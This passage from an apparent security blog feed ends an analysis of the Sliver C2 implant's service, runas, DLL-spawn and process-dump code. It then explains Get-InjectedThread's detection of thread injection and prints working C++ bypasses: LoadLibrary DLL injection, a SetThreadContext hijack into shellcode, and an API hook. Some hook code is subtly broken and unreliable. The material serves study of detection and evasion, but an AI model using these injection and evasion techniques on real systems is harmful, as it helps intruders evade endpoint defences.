fileBytes</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">upload, err := <span class="built_in">con</span>.Rpc.Upload(context.Background(), &amp;sliverpb.UploadReq&#123;</div><div class="line">Encoder: <span class="string">"gzip"</span>,</div><div class="line">Data:    uploadGzip,</div><div class="line">Path:    filePath,</div><div class="line">Request: <span class="built_in">con</span>.ActiveTarget.Request(ctx),</div><div class="line">&#125;)</div><div class="line"><span class="built_in">time</span>.<span class="built_in">Sleep</span>(<span class="number">5</span> * <span class="built_in">time</span>.Second)</div><div class="line"><span class="comment">// start service</span></div><div class="line">[...]</div><div class="line"><span class="built_in">con</span>.SpinUntil(<span class="string">"Starting service ..."</span>, serviceCtrl)</div><div class="line">start, err := <span class="built_in">con</span>.Rpc.StartService(context.Background(), &amp;sliverpb.StartServiceReq&#123;</div><div class="line">BinPath:            binaryPath,</div><div class="line">Hostname:           hostname,</div><div class="line">Request:            <span class="built_in">con</span>.ActiveTarget.Request(ctx),</div><div class="line">ServiceDescription: serviceDesc,</div><div class="line">ServiceName:        serviceName,</div><div class="line">Arguments:          <span class="string">""</span>,</div><div class="line">&#125;)</div><div class="line">serviceCtrl &lt;- true</div><div class="line">&lt;-serviceCtrl</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line"><span class="built_in">con</span>.PrintErrorf(<span class="string">"Error: %v\n"</span>, err)</div><div class="line"><span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> start.Response != nil &amp;&amp; start.Response.Err != <span class="string">""</span> &#123;</div><div class="line"><span class="built_in">con</span>.PrintErrorf(<span class="string">"Error: %s"</span>, start.Response.Err)</div><div class="line"><span class="keyword">return</span></div><div class="line">&#125;</div><div class="line"><span class="built_in">con</span>.PrintInfof(<span class="string">"Successfully started service on %s (%s)\n"</span>, hostname, binaryPath)</div><div class="line">removeChan := <span class="built_in">make</span>(chan <span class="keyword">bool</span>)</div><div class="line"><span class="built_in">con</span>.SpinUntil(<span class="string">"Removing service ..."</span>, removeChan)</div><div class="line">removed, err := <span class="built_in">con</span>.Rpc.RemoveService(context.Background(), &amp;sliverpb.RemoveServiceReq&#123;</div><div class="line">ServiceInfo: &amp;sliverpb.ServiceInfoReq&#123;</div><div class="line">Hostname:    hostname,</div><div class="line">ServiceName: serviceName,</div><div class="line">&#125;,</div><div class="line">Request: <span class="built_in">con</span>.ActiveTarget.Request(ctx),</div><div class="line">&#125;)</div><div class="line">[...]</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x09-runas"><a href="#0x09-runas" class="headerlink" title="0x09 runas"></a>0x09 runas</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以token方式执行，在<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/handlers/handlers_windows.go</code>的<code>runAsHandler</code>和<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/priv/priv_windows.go</code>的RunProcessAsUser函数中。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">func runAsHandler(data []byte, resp RPCResponse) &#123;</div><div class="line">runAsReq := &amp;sliverpb.RunAsReq&#123;&#125;</div><div class="line"><span class="keyword">err</span> := proto.Unmarshal(data, runAsReq)</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line"><span class="keyword">log</span>.Printf(<span class="string">"error decoding message: %v"</span>, <span class="keyword">err</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="built_in">return</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">out</span>, <span class="keyword">err</span> := priv.RunProcessAsUser(runAsReq.Username, runAsReq.ProcessName, runAsReq.<span class="keyword">Args</span>)</div><div class="line">runAs := &amp;sliverpb.RunAs&#123;</div><div class="line">Output: <span class="keyword">out</span>,</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">runAs.Response = &amp;commonpb.Response&#123;<span class="keyword">Err</span>: <span class="keyword">err</span>.<span class="keyword">Error</span>()&#125;</div><div class="line">&#125;</div><div class="line">data, <span class="keyword">err</span> = proto.Marshal(runAs)</div><div class="line">resp(data, <span class="keyword">err</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x10-spawdll"><a href="#0x10-spawdll" class="headerlink" title="0x10 spawdll"></a>0x10 spawdll</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本质就是通过CreateRemoteThread进行Dll注入。位于<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/handlers/handlers_windows.go</code>的spawnDllHandler方法。和<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/taskrunner/task_windows.go</code>的<code>SpawnDll</code>方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">SpawnDll</span><span class="params">(procName <span class="keyword">string</span>, processArgs []<span class="keyword">string</span>, ppid <span class="keyword">uint32</span>, data []<span class="keyword">byte</span>, offset <span class="keyword">uint32</span>, args <span class="keyword">string</span>, kill <span class="keyword">bool</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</div><div class="line">[....]</div><div class="line"><span class="comment">// 1 - Start process</span></div><div class="line">cmd, err := startProcess(procName, processArgs, ppid, &amp;stdoutBuff, &amp;stderrBuff, <span class="literal">true</span>)</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="string">""</span>, err</div><div class="line">&#125;</div><div class="line">pid := cmd.Process.Pid</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Printf(<span class="string">"[*] %s started, pid = %d\n"</span>, procName, pid)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, <span class="literal">true</span>, <span class="keyword">uint32</span>(pid))</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="string">""</span>, err</div><div class="line">&#125;</div><div class="line">currentProcHandle, err := windows.GetCurrentProcess()</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Println(<span class="string">"GetCurrentProcess failed"</span>)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> <span class="string">""</span>, err</div><div class="line">&#125;</div><div class="line">err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &amp;lpTargetHandle, <span class="number">0</span>, <span class="literal">false</span>, syscalls.DUPLICATE_SAME_ACCESS)</div><div class="line">[...]</div><div class="line">dataAddr, err := allocAndWrite(data, lpTargetHandle, <span class="keyword">uint32</span>(<span class="built_in">len</span>(data)))</div><div class="line">argAddr := <span class="keyword">uintptr</span>(<span class="number">0</span>)</div><div class="line">[...]</div><div class="line">log.Printf(<span class="string">"[*] Args addr: 0x%08x\n"</span>, argAddr)</div><div class="line"><span class="comment">//&#123;&#123;end&#125;&#125;</span></div><div class="line">startAddr := <span class="keyword">uintptr</span>(dataAddr) + <span class="keyword">uintptr</span>(offset)</div><div class="line">threadHandle, err := protectAndExec(lpTargetHandle, dataAddr, startAddr, argAddr, <span class="keyword">uint32</span>(<span class="built_in">len</span>(data)))</div><div class="line">[...]</div><div class="line"><span class="keyword">return</span> <span class="string">""</span>, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x11-procdump"><a href="#0x11-procdump" class="headerlink" title="0x11 procdump"></a>0x11 procdump</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;procdump进行进程转储，本质利用MiniDumpWriteDump的回调方法进行进程转储。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">minidump</span><span class="params">(pid <span class="keyword">uint32</span>, proc windows.Handle)</span> <span class="params">(ProcessDump, error)</span></span> &#123;</div><div class="line">dump := &amp;WindowsDump&#123;&#125;</div><div class="line"><span class="comment">// &#123;&#123;if eq .Config.GOARCH "amd64"&#125;&#125;</span></div><div class="line"><span class="comment">// Hotfix for #66 - need to dig deeper</span></div><div class="line"><span class="comment">// &#123;&#123;if .Config.Evasion&#125;&#125;</span></div><div class="line">err := evasion.RefreshPE(<span class="string">`c:\windows\system32\ntdll.dll`</span>)</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="comment">//&#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Println(<span class="string">"RefreshPE failed:"</span>, err)</div><div class="line"><span class="comment">//&#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> dump, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">heapHandle, err := syscalls.GetProcessHeap()</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> dump, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">procMemCounters := syscalls.ProcessMemoryCounters&#123;&#125;</div><div class="line">sizeOfMemCounters := <span class="keyword">uint32</span>(unsafe.Sizeof(procMemCounters))</div><div class="line">err = syscalls.GetProcessMemoryInfo(proc, &amp;procMemCounters, sizeOfMemCounters)</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Printf(<span class="string">"GetProcessMemoryInfo failed: %s\n"</span>, err)</div><div class="line"><span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> dump, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">heapSize := procMemCounters.WorkingSetSize + IncrementSize</div><div class="line"><span class="comment">//</span></div><div class="line">dumpBuffer, err := syscalls.HeapAlloc(heapHandle, <span class="number">0x00000008</span>, <span class="keyword">uintptr</span>(heapSize))</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> dump, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">outData := outDump&#123;</div><div class="line">outPtr: dumpBuffer,</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">callbackInfo := MiniDumpCallbackInformation&#123;</div><div class="line">CallbackRoutine: windows.NewCallback(minidumpCallback),</div><div class="line">CallbackParam:   <span class="keyword">uintptr</span>(unsafe.Pointer(&amp;outData)),</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">err = syscalls.MiniDumpWriteDump(</div><div class="line">proc,</div><div class="line">pid,</div><div class="line"><span class="number">0</span>,</div><div class="line">MiniDumpWithFullMemory,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="keyword">uintptr</span>(unsafe.Pointer(&amp;callbackInfo)),</div><div class="line">)</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="comment">//&#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">log.Println(<span class="string">"Minidump syscall failed:"</span>, err)</div><div class="line"><span class="comment">//&#123;&#123;end&#125;&#125;</span></div><div class="line"><span class="keyword">return</span> dump, err</div><div class="line">&#125;</div><div class="line">[...]</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Implant上线分析&quot;&gt;&lt;a href=&quot;#Implant上线分析&quot; class=&quot;headerlink&quot; title=&quot;Implant上线分析&quot;&gt;&lt;/a&gt;Implant上线分析&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sliver的Implant存在两种工作模式，一种是beacon模式，这是一种异步处理模式，Implant收到指令之后，并不会立即执行，而是等待一段时候之后进行处理。另外一种是session立即处理模式。在&lt;code&gt;https://github.com/BishopFox/sliver/blob/master/implant/sliver/sliver.go&lt;/code&gt;的main函数中，分别存在&lt;code&gt;beaconStartup&lt;/code&gt;和&lt;code&gt;sessionStartup&lt;/code&gt;。&lt;code&gt;beaconStartup&lt;/code&gt;对应的是beacon模式，&lt;code&gt;sessionStartup&lt;/code&gt;对应的是session模式。&lt;/p&gt;
    
    </summary>
    
      <category term="Windows攻防" scheme="https://findream.github.io/categories/Windows%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>detect threat inject —— 以Get-InjectedThread为例</title>
    <link href="https://findream.github.io/2023/02/20/detect%20thread%20Inject%E2%80%94%E2%80%94%E4%BB%A5Get-InjectedThread%E4%B8%BA%E4%BE%8B/"/>
    <id>https://findream.github.io/2023/02/20/detect thread Inject——以Get-InjectedThread为例/</id>
    <published>2023-02-20T12:45:11.000Z</published>
    <updated>2023-02-20T13:40:37.606Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文以Get-InjectedThread脚本为例，概括了检测线程注入的方法<a id="more"></a></li></ul><h2 id="0x01-线程注入检测原理"><a href="#0x01-线程注入检测原理" class="headerlink" title="0x01 线程注入检测原理"></a>0x01 线程注入检测原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2" target="_blank" rel="external">Get-InjectedThread</a>是由Joe Desimone和Jared Atkinson发布的powershell 线程注入检测脚本。通过检测线程的的状态和类型，如果内存类型不为<code>MEM_IMAGE</code>,则说明存在注入。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get-InjectedThread的具体检测逻辑是这样的:</p><ul><li>1) 通过<code>CreateToolhelpSnapshot</code>,<code>Thread32First</code>,<code>Thread32Next</code>遍历所有的线程</li><li>2）调用<code>OpenThread</code>获取目标线程的线程句柄</li><li>3）调用<code>NtQueryInformationThread</code>,将ThreadInformationClass参数指定为ThreadQuerySetWin32StartAddress，获取线程内存的起始地址Thread Start Address</li><li>4）调用<code>OpenProcess</code>获取线程对应进程的句柄</li><li>5）将<code>Process Handle</code>和<code>Thread Start Address</code>传递给<code>VirtualQueryEx</code>，获取<code>MEMORY_BASIC_INFORMATION</code>。</li><li>6) 检查<code>MEMORY_BASIC_INFORMATION</code>结构体中状态字段(<code>State</code>)和类型字段(<code>Type</code>),如果内存类型不为<code>MEM_IMAGE</code>,状态是<code>MEM_COMMIT</code>,则说明存在注入。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据elastic的John Uhlmann在2022年11月的<a href="https://www.elastic.co/cn/security-labs/get-injectedthreadex-detection-thread-creation-trampolines" target="_blank" rel="external">Get-InjectedThreadEx – Detecting Thread Creation Trampolines一文</a>，已经增加了启发式的方法来检测线程注入。即通过检测线程入口的关键字。</p><ul><li>1）MZ关键字</li><li>2）一些返回，跳转或者无意义填充的字节</li></ul><h2 id="0x02-绕过策略"><a href="#0x02-绕过策略" class="headerlink" title="0x02 绕过策略"></a>0x02 绕过策略</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;John Uhlmann在他的<a href="https://www.elastic.co/cn/security-labs/get-injectedthreadex-detection-thread-creation-trampolines" target="_blank" rel="external">文章</a>描述了几种绕过Get-InjectedThread的方法，但是这些方法都被他修复了。同样的XPN也在2018年针对早期版本的Get-InjectedThread进行了绕过。</p><h3 id="利用Dll规避内存类型和状态检测"><a href="#利用Dll规避内存类型和状态检测" class="headerlink" title="利用Dll规避内存类型和状态检测"></a>利用Dll规避内存类型和状态检测</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将shellcode包装到dll模块中，然后通过<code>CreateRemoteThread</code>远程线程注入的方式执行，因为线程入口点是<code>LoadLibrary</code>,因此绕过Get-InjectedThread。流程如下：</p><ul><li>1）获取调用地址LoadLibraryA。</li><li>2）在我们的目标进程中分配内存。</li><li>3）将我们的 DLL 的路径写入分配的内存中。</li><li>4）调用以启动新线程，入口点为LoadLibraryA，将DLL路径内存地址作为参数传递。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">example_loadlibrary</span><span class="params">(<span class="keyword">int</span> pid)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">char</span> currentDir[MAX_PATH];</div><div class="line">SIZE_T bytesWritten = <span class="number">0</span>;</div><div class="line">HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">false</span>, pid);</div><div class="line"><span class="keyword">if</span> (processHandle == INVALID_HANDLE_VALUE) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not open process with PID %d\n"</span>, pid);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> *alloc = VirtualAllocEx(processHandle, <span class="number">0</span>, <span class="number">4096</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</div><div class="line"><span class="keyword">if</span> (alloc == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not allocate memory in process\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> *_loadLibrary = GetProcAddress(LoadLibraryA(<span class="string">"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</div><div class="line"><span class="keyword">if</span> (_loadLibrary == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not find address of LoadLibrary\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">GetCurrentDirectoryA(MAX_PATH, currentDir);</div><div class="line">strncat_s(currentDir, <span class="string">"\\injectme.dll"</span>, MAX_PATH);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Injecting path to load DLL: %s\n"</span>, currentDir);</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(processHandle, alloc, currentDir, <span class="built_in">strlen</span>(currentDir) + <span class="number">1</span>, &amp;bytesWritten)) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not write into process memory\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Written %d bytes\n"</span>, bytesWritten);</div><div class="line"><span class="keyword">if</span> (CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)_loadLibrary, alloc, <span class="number">0</span>, <span class="literal">NULL</span>) == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: CreateRemoteThread failed [%d] :(\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="SetThreadContext线程注入"><a href="#SetThreadContext线程注入" class="headerlink" title="SetThreadContext线程注入"></a>SetThreadContext线程注入</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，拉起一个挂起的线程，该线程的入口点内存类型为<code>MEM_IMAGE</code>,通过<code>SetThreadContext</code>方法，将线程的入口点设置为Shellcode。在线程被拉起的时候，内存类型为<code>MEM_IMAGE</code>,由此绕过检测。</p><ul><li>1)在目标进程中分配内存来保存我们的 shellcode。</li><li>2)将我们的 shellcode 复制到分配的内存中。</li><li>3)产生一个挂起的线程，将 ThreadProc 设置为任何MEM_IMAGE标记的内存区域。</li><li>4)检索挂起线程的当前寄存器。</li><li>5)更新 RIP 寄存器以指向驻留在已分配内存中的 shellcode。</li><li>6)恢复执行。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[<span class="number">256</span>] = &#123;</div><div class="line"><span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span></div><div class="line">&#125;;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">example_switchsuspend</span><span class="params">(<span class="keyword">int</span> pid)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">char</span> currentDir[MAX_PATH];</div><div class="line">SIZE_T bytesWritten = <span class="number">0</span>;</div><div class="line">HANDLE threadHandle;</div><div class="line">HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">false</span>, pid);</div><div class="line"><span class="keyword">if</span> (processHandle == INVALID_HANDLE_VALUE) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not open process with PID %d\n"</span>, pid);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> *alloc = VirtualAllocEx(processHandle, <span class="number">0</span>, <span class="number">4096</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</div><div class="line"><span class="keyword">if</span> (alloc == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not allocate memory in process\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">void</span> *_loadLibrary = GetProcAddress(LoadLibraryA(<span class="string">"kernel32.dll"</span>), <span class="string">"LoadLibraryA"</span>);</div><div class="line"><span class="keyword">if</span> (_loadLibrary == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not find address of LoadLibrary\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">*(DWORD64 *)(shellcode + <span class="number">26</span>) = (DWORD64)GetProcAddress(LoadLibraryA(<span class="string">"user32.dll"</span>), <span class="string">"MessageBoxA"</span>);</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(processHandle, alloc, shellcode, <span class="keyword">sizeof</span>(shellcode), &amp;bytesWritten)) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: Could not write to process memory\n"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Written %d bytes to %p\n"</span>, bytesWritten, alloc);</div><div class="line">threadHandle = CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)_loadLibrary, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (threadHandle == <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[X] Error: CreateRemoteThread failed [%d] :(\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// Get the current registers set for our thread</span></div><div class="line">CONTEXT ctx;</div><div class="line">ZeroMemory(&amp;ctx, <span class="keyword">sizeof</span>(CONTEXT));</div><div class="line">ctx.ContextFlags = CONTEXT_CONTROL;</div><div class="line">GetThreadContext(threadHandle, &amp;ctx);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] RIP register set to %p\n"</span>, ctx.Rip);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Updating RIP to point to our shellcode\n"</span>);</div><div class="line">ctx.Rip = (DWORD64)alloc;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] Resuming thread execution at our shellcode address\n"</span>);</div><div class="line">SetThreadContext(threadHandle, &amp;ctx);</div><div class="line">ResumeThread(threadHandle);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="Hook-API函数"><a href="#Hook-API函数" class="headerlink" title="Hook API函数"></a>Hook API函数</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个方法就是Hook一个API函数，因为API函数本身内存类型和状态就可以绕过Get-InjectedThread工具。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">char hook[] = &#123;<span class="number">0x48</span>，<span class="number">0xb8</span>，<span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>,<span class="number">0x44</span>,<span class="number">0x55</span>,<span class="number">0x66</span>,<span class="number">0x77</span>,<span class="number">0x88</span>,<span class="number">0xff</span>，<span class="number">0xe0</span>&#125;;</div><div class="line">*(ULONG_PTR*)(hook + <span class="number">2</span>) = (ULONG PTR)pShellcode;</div><div class="line">auto pHookedFunc = GetProcAddress(GetModuleHandlew(L<span class="string">"ntd11.d11"</span>), <span class="string">"DbgUiRemoteBreakin"</span>);</div><div class="line">WriteProcessMemory(GetCurrentProcess()，pHookedFunc, hook, sizeof(hook)， NULL);</div><div class="line">CreateThread(NULL，<span class="number">0</span>，(LPTHREAD START ROUTINE)pHookedFunc，NULL，<span class="number">0</span>，NULL);</div></pre></td></tr></table></figure></p><h2 id="0x00-参考文章"><a href="#0x00-参考文章" class="headerlink" title="0x00 参考文章"></a>0x00 参考文章</h2><ul><li><p><a href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2" target="_blank" rel="external">Get-InjectedThread powershell源码</a></p></li><li><p><a href="https://www.elastic.co/cn/security-labs/get-injectedthreadex-detection-thread-creation-trampolines" target="_blank" rel="external">Get-InjectedThreadEx – Detecting Thread Creation Trampolines</a></p></li><li><p><a 